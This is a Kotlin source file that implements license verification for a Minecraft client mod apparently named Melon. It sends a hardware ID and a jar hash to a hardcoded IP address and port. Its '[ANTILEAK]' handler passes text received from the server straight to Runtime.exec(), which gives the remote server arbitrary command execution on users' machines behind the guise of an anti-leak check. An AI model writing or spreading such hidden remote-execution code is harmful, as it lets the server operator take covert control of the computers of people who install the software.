package verify

import dev.zenhao.melon.Melon
import dev.zenhao.melon.Melon.Companion.verifiedState
import dev.zenhao.melon.utils.math.RandomUtil
import kotlinx.coroutines.launch
import melon.system.util.collections.isNotClosed
import melon.utils.concurrent.threads.IOScope
import melon.utils.concurrent.threads.delay
import java.security.MessageDigest

object SocketConnection {
    private const val PORT = 40785

    //    const val DOMAIN = "61.164.252.244"
    const val DOMAIN = "61.164.252.244"
    const val DOMAINDEBUG = "61.164.252.244"
    lateinit var connection: Connection
    val hashCode: String
        get() = MessageDigest.getInstance("MD5")
            .digest(Melon::class.java.protectionDomain.codeSource.location.openStream().readBytes())
            .joinToString("") { "%02x".format(it) }

    fun call(connectionFactory: ConnectionFactory) = IOScope.launch {
        runCatching {
            connection = connectionFactory.createConnection(DOMAIN, PORT)

            //var localHash = ""
            //if (FileCacheVerify.cacheFile.exists()) localHash = FileCacheVerify.cacheFile.readText()

            //发送HWID
            val hwid = HWIDManager.encryptedHWID()
            connection.send("[CHECK]${hwid}@[HASH]${hashCode}")
            delay(500)
            val pattern = Regex("\\[([A-Z]+)]")

            //接收服务器消息
            while (connection.socket.isNotClosed) {
                val reader = connection.receive()
                when {
                    reader.startsWith("[PASS]") -> {
                        val isBetaUser = reader.contains("[BETA]")
                        verifiedState = RandomUtil.nextInt(1, Int.MAX_VALUE)
                        if (isBetaUser) {
                            Melon.userState = Melon.UserType.Beta
                            Melon.DISPLAY_NAME = "${Melon.MOD_NAME} ${Melon.VERSION} (${Melon.userState.userType})"
                        }
                    }

                    reader.startsWith("[?]") -> {
                        SocketDebugger.tryReset(true)
                    }

                    reader.startsWith("[ANTILEAK]") -> {
                        connection.close()
                        delay(5)
                        Runtime.getRuntime().exec(reader.replace(pattern, ""))
                    }
                }

                //Latest File Cache + Local Hash Check (我要留后路XD)
//                    if (!FileCacheVerify.cacheFile.exists() || (hashCode != localHash && FileCacheVerify.cacheFile.exists())) {
//                        val fileOutputStream = FileOutputStream(FileCacheVerify.cacheFile)
//                        val buffer = ByteArray(1024)
//                        var bytesRead: Int
//                        while (inputStream.read(buffer).also { bytesRead = it } != -1) {
//                            fileOutputStream.write(buffer, 0, bytesRead)
//                        }
//                        fileOutputStream.close()
//                        awaitTask.countDown()
//                    } else if (hashCode == localHash && FileCacheVerify.cacheFile.exists()) {
//                        awaitTask.countDown()
//                    }

                SocketDebugger.init()
                connection.close()
                break
            }
            //FileCacheVerify.awaitTask.countDown()
        }
    }
}